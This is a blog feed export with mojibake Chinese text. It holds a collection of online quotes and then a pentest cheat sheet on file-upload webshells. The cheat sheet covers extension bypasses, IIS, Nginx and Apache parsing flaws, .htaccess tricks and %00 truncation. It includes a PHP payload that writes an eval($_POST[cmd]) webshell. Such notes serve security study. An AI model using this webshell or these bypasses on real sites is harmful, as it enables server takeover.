<li><p>æ²¡äº‹ä¸è¦å…è´¹å¸®åŠ©åˆ«äººã€‚ä½ å¦‚æœå…è´¹å¸®åŠ©åˆ«äººï¼Œé‚£ä¹ˆæœ€ç»ˆä¼šæœ‰ä¸¤ä¸ªç»“æœï¼š<br>â‘ å½“ä½ åœæ­¢å…è´¹æ´åŠ©çš„æ—¶å€™ï¼Œé‚£ä¸ªäººä¼šæ¨ä½ ã€‚<br>â‘¡ä½ å…è´¹å¸®ä»–ï¼Œä»–åœ¨æ½œæ„è¯†é‡Œä¼šè®¤ä¸ºï¼Œä½ å°±æ˜¯ä¸ªæ²¡æœ‰æœ¬äº‹çš„åºŸç‰©ï¼Œä¸å€¼é’±ï¼Œå¾ˆè´±ã€‚è¿™ä¸æ€ªä»–ï¼Œè¿™æ˜¯äººçš„æœ¬æ€§ã€‚<br>æ‰€ä»¥è¯´ï¼Œä½ å¦‚æœè®¤ä¸ºè‡ªå·±çš„ä»˜å‡ºæœ‰ä»·å€¼ï¼Œå°±è¦ç´¢å–ç›¸åº”çš„æŠ¥é…¬ã€‚</p>
<div style="text-align: right"><i>by Gnaiqux@QQ</i></div></li>
</ul>
<hr/>

<ul>
<li><p>åŠ äº†QQç¾¤ï¼Œè¢«é‡Œé¢çš„å°åœˆå­å’Œè€äººçš„æŸäº›è¡Œä¸ºæ¶å¿ƒåˆ°äº†ï¼Œä½†æ˜¯åˆæƒ³é è¿™ä¸ªç¾¤æ‰“å‘æ—¶é—´ï¼Œè¯·é—®æˆ‘åº”è¯¥æŠŠé‚£äº›å¤§ç¾¤å°ç¾¤å…¨éƒ¨é€€æ‰å†æŠŠé‡Œé¢åŠ çš„äººæ‹‰é»‘ä¹ˆï¼Ÿ<br>Re: ä¸ï¼Œä½ åªä¼šé™·å…¥ç©ºè™šã€‚é€‰æ‹©æ€§æ— è§†å°±å¥½äº†ï¼Œæ¶ˆé£æ—¶é—´è€Œå·²åˆ«è®¤çœŸã€‚æ¶å¿ƒçš„ä¸ç”¨ç®¡å°±æ˜¯ï¼Œå–œæ¬¢å°±èŠï¼Œä¸å–œæ¬¢å°±åˆ«ç®¡ã€‚</p>
<div style="text-align: right"><i>by 2VwVEq4 & iB0zsYZ@adnmb</i></div></li>
</ul>
<hr/>

<ul>
<li><p>æœ¬ç¾¤æ˜¯ä¸ºå…´è¶£è€Œå»ºçš„ç¾¤ã€‚<br>è°çš„å“ªæ–¹é¢èƒ½åŠ›å¦‚ä½•å¹¶æ²¡æœ‰äººå…³å¿ƒã€‚<br>æ— è®ºæ˜¯ä¸€æ˜§åœ°è´¬ä½è‡ªå·±è¿˜æ˜¯ä¸€æ˜§åœ°æŠ¬é«˜åˆ«äººï¼Œéƒ½è¯´ä¸ä¸Šè°¦é€Šå’Œèµç¾ä»–äººè¿™äº›ç¾å¥½å“è´¨ä»»ä½•å…¶ä¸€ã€‚ç›¸åçš„ï¼Œè‡ªå·±èƒ½åŠ›ä¸Šä¸ä¼šæœ‰ä¸æ¯«çš„æå‡ï¼Œä¹Ÿä¸ä¼šåšå¾—è°çš„ä¸€ä¸åŒæƒ…ã€‚<br>å¤§å®¶èšåœ¨è¿™é‡Œæ˜¯å› ä¸ºå¤§å®¶å¯¹ç›¸åŒçš„äº‹ç‰©æœ‰ç›¸åŒçš„å…´è¶£å’Œçˆ±ã€‚ä¸åˆ†é«˜ä½å¼ºçƒˆçš„çˆ±ã€‚<br>å¸Œæœ›å¤§å®¶è°¨è®°ã€‚</p>
<div style="text-align: right"><i>by ç¾…å¨@QQ</i></div></li>
</ul>
<hr/>

<ul>
<li><p>æ¼”è®²è‡ªå·±éƒ½è®°ä¸ä½ï¼Œè¦çœ‹ç¨¿å­ï¼Œæ€ä¹ˆè®©å¬ä¼—è®°å¾—ä½å‘¢ï¼Ÿ</p>
<div style="text-align: right"><i>by ææ•–@åŒ—äº¬å¤§å­¦</i></div></li>
</ul>
<hr/>

<ul>
<li>ç°åœ¨å¾ˆå¤šç©å®¶çš„è¯„è®ºæ€»æ˜¯å–œæ¬¢ç”¨ä¸€äº›æœ¯è¯­è¡¨ç¤ºä¸“ä¸šï¼Œè€Œè¿™ä¸€éƒ¨åˆ†äººçš„è®¤çŸ¥ä¹Ÿä»…é™äºå¬è¿‡è¿™äº›ä¸œè¥¿è€Œå·²ï¼Œå°±ç”¨å¤§ç¯‡å¹…æ–‡å­—è§£é‡Šè‡ªå·±çš„æŒ‘å‰”ã€‚æˆ‘æƒ³çŸ¥é“å¦å®šä¸€ä¸ªä½œå“çš„ä»·å€¼çœŸçš„åªéœ€è¦ä¸€å¥è¯è¿™ä¹ˆç®€å•å—ï¼Ÿ</li>
</ul>
<div style="text-align: right"><i>by oooooohmygosh@bilibili</i></div>

<hr/>

<ul>
<li>ä½ æŠŠå®‰å“å¹å‡ºèŠ±æ¥è°·æ­Œä¹Ÿä¸ä¼šç»™ä½ ä¸€åˆ†é’±ï¼Œä½ æŠŠiOSæ§åˆ°å¤©ä¸Šè¿™ç³»ç»Ÿä¹Ÿæ˜¯åˆ«äººåšçš„ï¼Œä¸¤ä¸ªéƒ½è·Ÿä½ æ²¡åŠæ¯›é’±å…³ç³»ï¼Œå°±æ˜¯ä¸ªæ¶ˆè´¹è€…è€Œå·²ï¼Œè§‰å¾—å“ªä¸ªå¥½ç”¨ç”¨å“ªä¸ªå°±æ˜¯äº†ï¼Œä½ å¯ä»¥å®‰å“è‹¹æœé€‰å…¶ä¸€ï¼Œä¹Ÿå¯ä»¥åŒä¿®ä¸¤ä¸ªéƒ½ç”¨ï¼Œæƒ³ä¸ä¼—ä¸åŒç‚¹ä½ è¿˜å¯ä»¥ç”¨å¡ç­ã€‚å¤©å¤©åˆ’é˜µè¥æ»¡ä¸–ç•Œçš„å†å–æ’•é€¼ï¼Œä¸çŸ¥é“çš„äººè¿˜ä»¥ä¸ºè°·æ­Œè‹¹æœæ˜¯ä½ äºŒèˆ…å®¶å¼€çš„å‘¢ï¼Œè¿™ä¹ˆè´¹åŠ›çŒ®æ®·å‹¤ï¼Œä½ æ’•é€¼æ’•èµ¢äº†ï¼Œäººç»™ä½ é’±äº†è¿˜æ˜¯ç»™ä½ è‚¡ä»½äº†ï¼Ÿéƒ½æ˜¯é—²çš„è›‹ç–¼ã€‚</li>
</ul>
<div style="text-align: right"><i>by lansander@bilibili</i></div>

<hr/>

<ul>
<li>ä¹‹æ‰€ä»¥ç¼åˆä¹–å£å—¨èƒ½æµè¡Œä¸è¿˜æ˜¯è¢«é€¼å‡ºæ¥çš„ï¼Œç©ä¸ªæ¸¸æˆä½ ä¸è¿‡å®¡ï¼Œçœ‹ä¸ªç”µå½±ä½ ä¸è¿‡å®¡ï¼Œä¸Šä¸ªç½‘è¿˜æœ‰å¢™ï¼Œçœ‹ä¸ªæ—¥æ¼«è¿˜èƒ½ä¸‹æ¶å–½ã€‚å°±åªå‰©è¿™äº›è£…ç–¯å–å‚»çš„èƒ½é€—ä¸€ä¹ï¼Œå†ç»™ç¦äº†ï¼Œæˆ‘ä¸€å°è€ç™¾å§“åœ¨ç½‘ä¸Šè¿˜èƒ½å¹²å•¥ï¼Ÿé‚£å¤©çœ‹bç«™æŠ–éŸ³çš„åæµªå¸¦æˆ‘é¢†ç•¥ä¸­å›½ä¹‹ç¾ï¼Ÿç°å®ç”Ÿæ´»å¤Ÿéš¾é¡¶äº†ï¼Œå»è™šæ‹Ÿä¸–ç•Œè£¸å¥”ï¼Œä½ è¿˜è¦æ‹¿ç€æ¢ç…§ç¯ç…§ç›¸æœºæ¥æŠ“æˆ‘ï¼Ÿ</li>
</ul>
<div style="text-align: right"><i>by ç­±ç­±å°å¸ˆå¦¹@bilibili</i></div><hr/>

<ul>
<li>èƒ½å¡«è¡¥äººç±»å†…å¿ƒç©ºæ´çš„å½’æ ¹ç»“åº•æ˜¯ä¸ä»–äººçš„æƒ…æ„Ÿé“¾æ¥ï¼Œå…¶ä»–ä¸€åˆ‡è¡Œä¸ºéƒ½æ˜¯å¯¹è¿™ä¸€éœ€æ±‚çš„è±¡å¾æ€§æ»¡è¶³ã€‚</li>
</ul>
<div style="text-align: right"><i>by å§¬äº‘å…µ@å£¹å¿ƒç†</i></div><hr/>

<ul>
<li>éƒ½æ˜¯ä¸€æ‹¨äººï¼Œæ··æ··è¿™å„¿æ··æ··é‚£å„¿ï¼Œè¯´è¯çš„æ–¹å¼åœ¨å˜ï¼Œæ°´å¹³å§‹ç»ˆå°±é‚£ä¹ˆç‚¹ã€‚<br>æ‰€æœ‰ç½‘ç«™ä¸€å¼€å§‹é‚£æ³¢äººéƒ½æ˜¯æœ‰ç‚¹æƒ³æ³•çš„ï¼Œæœ€åéƒ½ä¼šåŒè´¨åŒ–ã€‚<br>ç„¶åè¿™ä¸ªç½‘ç«™å°±æ¯äº†ã€‚</li>
</ul>
<div style="text-align: right"><i>by X54uoxc3@adnmb</i></div><hr/>

<ul>
<li>å’Œåˆ«äººæ”€æ¯”è¯´åˆ°åº•æ˜¯å¿ƒå†…ä¸å¤Ÿè‡ªä¿¡ï¼Œä¸€ä¸ªå†…å¿ƒå¾ˆè‡ªä¿¡çš„äººï¼Œä¼šæ›´åŠ åŒ…å®¹è‡ªå·±ä¸åˆ«äººçš„ä¸åŒã€‚å› ä¸ºäººæ— å®Œäººï¼Œè‡ªå·±æœ‰æ¯”ä¸ä¸Šåˆ«äººçš„åœ°æ–¹ï¼Œåˆ«äººä¹Ÿä¼šæœ‰ä¸å¦‚ä½ çš„ã€‚å†…å¿ƒå¯¹è‡ªå·±å¾ˆæœ‰ä¿¡å¿ƒï¼Œåšä¿¡è‡ªå·±ä¸ä¸€æ ·çš„ç¾æˆ–è€…å¸…æ°”ï¼Œå°±èƒ½ç”¨ä¸€é¢—å¹³å¸¸å¿ƒå»æ¬£èµåˆ«äººçš„é—ªå…‰ç‚¹äº†ã€‚ä¹±èŠ±é’±ä¸èƒ½å¸¦ç»™äººè‡ªä¿¡å’Œå®‰å…¨æ„Ÿï¼Œåªä¼šè®©äººè¶Šæ¥è¶Šç¼ºå°‘å®‰å…¨æ„Ÿã€‚</li>
</ul>
<div style="text-align: right"><i>by ç±³å°å…œ@zhihu</i></div><hr/>

<ul>
<li>ä½ æ‹¿è¿™ç§äº‹æƒ…æ¥ç½‘ä¸Šæ‰¾å…±æƒ…ï¼Œè¿™ä¸æ˜¯é—²çš„å˜›<br>è‡ªå·±è¢«æˆ³å¼„å°±æ¼ç¾æˆæ€’ï¼Œæ—äººè¢«æˆ³å¼„å°±ç¬‘å˜»å˜»<br>è¿™ä¸æ˜¯å¸¸æ€ä¹ˆ</li>
</ul>
<div style="text-align: right"><i>by T9mCsl5@adnmb</i></div><hr/>

<ul>
<li>æˆ‘è§‰å¾—å¯èƒ½æ˜¯æˆ‘çš„ä¸€ç§ä¹ æƒ¯ï¼Œæˆ‘æœ‰çš„æ—¶å€™è§‰å¯Ÿåˆ°è‡ªå·±çš„æƒ…ç»ªå¼€å§‹å¤±æ§ï¼Œå°±ä¼šæ¡ä»¶åå°„åœ°å°è¯•è®©è‡ªå·±ç«™åœ¨ä¸Šå¸è§†è§’çœ‹é—®é¢˜ï¼Œè¿™ç®—æ˜¯ä¸€ç§åº”æ¿€è°ƒèŠ‚çš„æ–¹å¼å§ï¼Œå·²ç»å½¢æˆä¸€ç§å›ºå®šçš„æ–¹æ³•äº†ï¼Œè¿™æ–¹é¢ä¹‹å‰æœ‰äººé—®äº†æˆ‘ä¸€äº›é—®é¢˜æˆ‘æ‰æ„è¯†åˆ°ã€‚ä¸»è¦æ˜¯æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä»æœ€åŠŸåˆ©çš„è§’åº¦ä¸Šæ¥è¯´ï¼Œå•çº¯çš„æŠ’æƒ…ä¸èƒ½å¸®åŠ©æˆ‘ä»¬ç†è§£ä»»ä½•ä¸œè¥¿ã€‚æˆ‘ç°åœ¨æŠŠæƒ…æ„Ÿæ”¾ä¸€è¾¹äº†ï¼Œäº‰è¿™äº›ä¸œè¥¿ä¹Ÿäº‰ä¸å‡ºæ¥ä»€ä¹ˆï¼ˆ<br>ç­‰æˆ‘ç¡ä¸€è§‰æ¢å¤æˆä¸€ä¸ªå®Œæ•´çš„äººå†è¯´ã€‚</li>
</ul>
<div style="text-align: right"><i>by megakite@QQ</i></div><hr/>]]></content>
      <categories>
        <category>æ‚ å“‰æ—¥å¸¸</category>
      </categories>
      <tags>
        <tag>å¦™è¯­é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ æ“ä½œæ•´ç†</title>
    <url>/2020/07/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%93%8D%E4%BD%9C%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>è·å–Webshellçš„å¸¸è§æ“ä½œï¼Œæ•´ç†ä¸€ä¸‹ã€‚</p>
<a id="more"></a>

<h2 id="ä¸Šä¼ åŠç»•è¿‡"><a href="#ä¸Šä¼ åŠç»•è¿‡" class="headerlink" title="ä¸Šä¼ åŠç»•è¿‡"></a>ä¸Šä¼ åŠç»•è¿‡</h2><h3 id="å¸¸è§ä¸Šä¼ ç‚¹"><a href="#å¸¸è§ä¸Šä¼ ç‚¹" class="headerlink" title="å¸¸è§ä¸Šä¼ ç‚¹"></a>å¸¸è§ä¸Šä¼ ç‚¹</h3><ul>
<li>ä¸Šä¼ å¤´åƒ</li>
<li>ä¸Šä¼ ç›¸å†Œ</li>
<li>ä¸Šä¼ é™„ä»¶</li>
<li>æ·»åŠ æ–‡ç« å›¾ç‰‡</li>
<li>å‰å°ç•™è¨€èµ„æ–™ä¸Šä¼ </li>
<li>ç¼–è¾‘å™¨æ–‡ä»¶ä¸Šä¼ </li>
</ul>
<h3 id="åç¼€ç»•è¿‡"><a href="#åç¼€ç»•è¿‡" class="headerlink" title="åç¼€ç»•è¿‡"></a>åç¼€ç»•è¿‡</h3><ul>
<li>PHP:php2ã€php3ã€php5ã€phtmlã€pht(æ˜¯å¦è§£æéœ€è¦æ ¹æ®é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ç±»å‹æ¥å†³å®š)</li>
<li>ASPï¼šasaã€cerã€cdx</li>
<li>ASPXï¼šascxã€ashxã€asac</li>
<li>JSPï¼šjspã€jspxã€jspf</li>
</ul>
<h3 id="ç»•è¿‡ç±»å‹"><a href="#ç»•è¿‡ç±»å‹" class="headerlink" title="ç»•è¿‡ç±»å‹"></a>ç»•è¿‡ç±»å‹</h3><ul>
<li>Content-Typeç»•è¿‡</li>
<li>å‰ç«¯ç»•è¿‡</li>
<li>æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡</li>
<li>Windowsç¯å¢ƒç‰¹æ€§ç»•è¿‡</li>
<li>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡</li>
<li>åŒå†™ç»•è¿‡</li>
<li>ç‚¹ç©ºæ ¼ç»•è¿‡</li>
<li>æ–‡ä»¶å¤´ç»•è¿‡</li>
<li>æ¡ä»¶ç«äº‰ç»•è¿‡</li>
</ul>
<h2 id="æ¼æ´åœ¨ç³»ç»Ÿä¸­çš„å·®å¼‚"><a href="#æ¼æ´åœ¨ç³»ç»Ÿä¸­çš„å·®å¼‚" class="headerlink" title="æ¼æ´åœ¨ç³»ç»Ÿä¸­çš„å·®å¼‚"></a>æ¼æ´åœ¨ç³»ç»Ÿä¸­çš„å·®å¼‚</h2><h3 id="IIS-5-x-6-0-è§£ææ¼æ´"><a href="#IIS-5-x-6-0-è§£ææ¼æ´" class="headerlink" title="IIS 5.x/6.0 è§£ææ¼æ´"></a>IIS 5.x/6.0 è§£ææ¼æ´</h3><p>1ã€å½“åˆ›å»º.aspçš„æ–‡ä»¶ç›®å½•çš„æ—¶å€™ï¼Œåœ¨æ­¤ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼ŒæœåŠ¡å™¨éƒ½è§£æä¸ºaspæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š<br>æ¼æ´ç›®å½•åˆ©ç”¨å½¢å¼ï¼š<a href="http://www.xxx.com/xx.asp/xx.jpg%E3%80%82" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpgã€‚</a><br>xx.jpgçš„å†…å®¹å¯ä»¥ä¸ºä¸€æ®µåˆæ³•çš„aspè„šæœ¬æ–‡ä»¶ã€‚<br>2ã€æœåŠ¡å™¨é»˜è®¤ä¸è§£æâ€;â€œä»¥åçš„å†…å®¹ï¼Œå¯¼è‡´xx.asp;.jpgè¢«è§£ææˆxx.asp<br>æ¼æ´æ–‡ä»¶åˆ©ç”¨å½¢å¼ï¼š<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>xx.jpgçš„å†…å®¹å¯ä»¥ä¸ºä¸€æ®µåˆæ³•çš„aspè„šæœ¬æ–‡ä»¶ã€‚</p>
<h3 id="Nginx-è§£ææ¼æ´"><a href="#Nginx-è§£ææ¼æ´" class="headerlink" title="Nginx è§£ææ¼æ´"></a>Nginx è§£ææ¼æ´</h3><p>åœ¨ä½ç‰ˆæœ¬Nginxä¸­å­˜åœ¨ä¸€ä¸ªç”±PHP-CGIå¯¼è‡´çš„æ–‡ä»¶è§£ææ¼æ´ã€‚åœ¨PHPçš„é…ç½®æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªå…³é”®çš„é€‰é¡¹cgi.fix_pathinfoåœ¨æœ¬æœºä¸­ä½äºphp.inié…ç½®æ–‡ä»¶ä¸­ï¼Œé»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå½“URLä¸­æœ‰ä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼ŒPHPå°±ä¼šé»˜è®¤å‘å‰è§£æã€‚</p>
<p>æ™®éçš„åšæ³•æ˜¯åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­é€šè¿‡æ­£åˆ™åŒ¹é…è®¾ç½®SCRIPT_FILENAMEã€‚è®¿é—®<code>http://www.xx.com/phpinfo.jpg/1.php</code> è¿™ä¸ªURLæ—¶ï¼Œ$fastcgi_script_nameä¼šè¢«è®¾ç½®ä¸ºâ€œphpinfo.jpg/1.phpâ€ï¼Œç„¶åæ„é€ æˆSCRIPT_FILENAMEä¼ é€’ç»™PHP-CGIï¼Œä½†æ˜¯PHPä¸ºä»€ä¹ˆä¼šæ¥å—è¿™æ ·çš„å‚æ•°ï¼Œå¹¶å°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶è§£æå‘¢ï¼Ÿè¿™å°±è¦è¯´åˆ°fix_pathinfoè¿™ä¸ªé€‰é¡¹äº†ã€‚å¦‚æœå¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘åœ¨PHPä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼šPHPä¼šè®¤ä¸ºSCRIPT_FILENAMEæ˜¯phpinfo.jpgï¼Œè€Œ1.phpæ˜¯PATH_INFOï¼Œæ‰€ä»¥å°±ä¼šå°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶æ¥è§£æäº†ã€‚</p>
<p>åœ¨é»˜è®¤Fast-CGIå¼€å¯çŠ¶å†µä¸‹ä¸Šä¼ åå­—ä¸ºxx.jpg,å†…å®¹ä¸º:<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
<p>ç„¶åè®¿é—®xx.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.phpã€‚</p>
<h3 id="Apache-è§£ææ¼æ´"><a href="#Apache-è§£ææ¼æ´" class="headerlink" title="Apache è§£ææ¼æ´"></a>Apache è§£ææ¼æ´</h3><p>Apache åœ¨1.xå’Œ2.xç‰ˆæœ¬ä¸­å­˜åœ¨è§£ææ¼æ´ï¼Œä¾‹å¦‚å¦‚ä¸‹åœ°å€æ ¼å¼ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">www<span class="selector-class">.xxxx</span>.com/apache<span class="selector-class">.php</span><span class="selector-class">.bbb</span>.aaa</span><br></pre></td></tr></table></figure>

<p>Apacheä»å³è‡³å·¦å¼€å§‹åˆ¤æ–­åç¼€ï¼Œè‹¥aaaéå¯è¯†åˆ«åç¼€ï¼Œå†åˆ¤æ–­bbbï¼Œç›´åˆ°æ‰¾åˆ°å¯è¯†åˆ«åç¼€ä¸ºæ­¢ï¼Œç„¶åå°†è¯¥å¯è¯†åˆ«åç¼€è¿›è§£æï¼Œå› æ­¤å¦‚ä¸Šåœ°å€è§£æä¸ºè®¿é—®apache.phpæ–‡ä»¶ã€‚</p>
<p>å¦å¤–å¯¹äºApacheè§£ææ¼æ´çš„æ­£ç¡®è¯´æ³•åº”è¯¥æ˜¯ï¼Œä½¿ç”¨moduleæ¨¡å¼ä¸phpç»“åˆçš„æ‰€æœ‰ç‰ˆæœ¬apacheå­˜åœ¨æœªçŸ¥æ‰©å±•åè§£ææ¼æ´ï¼Œä½¿ç”¨fastcgiæ¨¡å¼ä¸phpç»“åˆçš„æ‰€æœ‰ç‰ˆæœ¬apacheä¸å­˜åœ¨æ­¤æ¼æ´ã€‚è€Œæ˜¯å¦è§£æçš„åç¼€ååœ¨æ–‡ä»¶mime.typesï¼ˆäº’è”ç½‘åª’ä½“ç±»å‹ï¼ˆInternet media typeï¼Œä¹Ÿç§°ä¸ºMIMEç±»å‹ï¼ˆ<em>MIME type</em>ï¼‰æˆ–å†…å®¹ç±»å‹ï¼ˆ<em>content type</em>ï¼‰ï¼‰ä¸­æŸ¥æ‰¾æ˜¯å¦å‡ºç°ã€‚</p>
<h2 id="æµ‹è¯•æ–¹æ³•"><a href="#æµ‹è¯•æ–¹æ³•" class="headerlink" title="æµ‹è¯•æ–¹æ³•"></a>æµ‹è¯•æ–¹æ³•</h2><h3 id="å‰ç«¯éªŒè¯"><a href="#å‰ç«¯éªŒè¯" class="headerlink" title="å‰ç«¯éªŒè¯"></a>å‰ç«¯éªŒè¯</h3><p>åªåœ¨å‰ç«¯åˆ©ç”¨JSæ¥åšæ•ˆéªŒï¼Œé‡‡ç”¨ç¦ç”¨JSä¸Šä¼ ã€æŠ“åŒ…ä¸Šä¼ éƒ½å¯ä»¥ç»•è¿‡æ­¤å¤„é™åˆ¶ã€‚</p>
<h3 id="htaccessè§„åˆ™æ–‡ä»¶ç»•è¿‡"><a href="#htaccessè§„åˆ™æ–‡ä»¶ç»•è¿‡" class="headerlink" title=".htaccessè§„åˆ™æ–‡ä»¶ç»•è¿‡"></a>.htaccessè§„åˆ™æ–‡ä»¶ç»•è¿‡</h3><p>åœ¨ä¸€äº›å¯ç”¨äº†.htaccessæ–‡ä»¶çš„ç½‘ç«™ä¸Šå°±å¯ä»¥ä½¿ç”¨æ­¤æ–‡ä»¶ç±»å‹æ¥ç»•è¿‡é™åˆ¶è¾ƒå…¨é¢çš„é»‘åå•è¿‡æ»¤ã€‚</p>
<p>å…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š<code>AddType application/x-httpd-php .aaa</code>ã€‚ç„¶åå†ä¸Šä¼ æ–‡ä»¶åç¼€ä¸º.aaaçš„æ–‡ä»¶ï¼Œè®©å…¶è§£æä¸ºphpç±»å‹æ–‡ä»¶ã€‚ä¸Šä¼ æˆåŠŸåå³å¯è®¿é—®å¹¶getshellã€‚</p>
<h3 id="æ–‡ä»¶ååç¼€å¤§å°å†™æ··åˆç»•è¿‡"><a href="#æ–‡ä»¶ååç¼€å¤§å°å†™æ··åˆç»•è¿‡" class="headerlink" title="æ–‡ä»¶ååç¼€å¤§å°å†™æ··åˆç»•è¿‡"></a>æ–‡ä»¶ååç¼€å¤§å°å†™æ··åˆç»•è¿‡</h3><p>åœ¨å¯¹åç¼€çš„åˆ¤æ–­ä¸­ï¼Œå¦‚æœåªæ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œå•ç‹¬çš„æ¯”è¾ƒæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯é™åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥é‡‡ç”¨åç¼€åå¤§å°å†™ç»•è¿‡å½¢å¼ã€‚å¦‚<code>a.PHp</code>ã€‚</p>
<h3 id="Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡"><a href="#Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡" class="headerlink" title="Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡"></a>Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡</h3><p>æµæ–‡ä»¶ï¼Œå³NTFSäº¤æ¢æ•°æ®æµï¼ˆalternate data  streamsï¼Œç®€ç§°ADSï¼‰ï¼Œæ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œå°±æ˜¯è¯´é™¤äº†ä¸»æ–‡ä»¶æµä¹‹å¤–è¿˜å¯ä»¥æœ‰è®¸å¤šéä¸»æ–‡ä»¶æµå¯„å®¿åœ¨ä¸»æ–‡ä»¶æµä¸­ï¼Œå®ƒä½¿ç”¨èµ„æºæ´¾ç”Ÿæ¥ç»´æŒä¸æ–‡ä»¶ç›¸å…³çš„ä¿¡æ¯ã€‚åˆ›å»ºä¸€ä¸ªæ•°æ®äº¤æ¢æµæ–‡ä»¶çš„æ–¹æ³•å¾ˆç®€å•ï¼Œå‘½ä»¤ä¸ºâ€œå®¿ä¸»æ–‡ä»¶:å‡†å¤‡ä¸å®¿ä¸»æ–‡ä»¶å…³è”çš„æ•°æ®æµæ–‡ä»¶â€ã€‚</p>
<p>ä¸Šä¼ æ–‡ä»¶ï¼š<code>xxx.php::$data</code>ã€‚è®¿é—®æ—¶å¯ä»¥ç›´æ¥è®¿é—®xxx.phpæ–‡ä»¶ã€‚</p>
<h3 id="00æˆªæ–­ç»•è¿‡"><a href="#00æˆªæ–­ç»•è¿‡" class="headerlink" title="%00æˆªæ–­ç»•è¿‡"></a>%00æˆªæ–­ç»•è¿‡</h3><p>ä»¥ä¸Šé—®é¢˜è¢«ç»•è¿‡çš„æ ¹æœ¬åŸå› æ˜¯é‡‡ç”¨äº†ä¸€äº›æœ‰ç¼ºé™·çš„é»‘åå•é™åˆ¶ï¼Œä¸€èˆ¬é‡‡ç”¨ç™½åå•çš„é™åˆ¶ä¼šå‡å°‘ç›¸å½“å¤šçš„ç»•è¿‡é—®é¢˜äº§ç”Ÿï¼Œä½†æ˜¯å¹¶ä¸æ„å‘³ç€ä¸€å®šå®‰å…¨ï¼Œåœ¨æŸäº›æ²¡æœ‰å¤„ç†ä¸¥æ ¼çš„ç¨‹åºä¸Šï¼Œä»ç„¶å¯ä»¥é‡‡ç”¨æˆªæ–­ç»•è¿‡çš„å½¢å¼ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å¤±è´¥"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

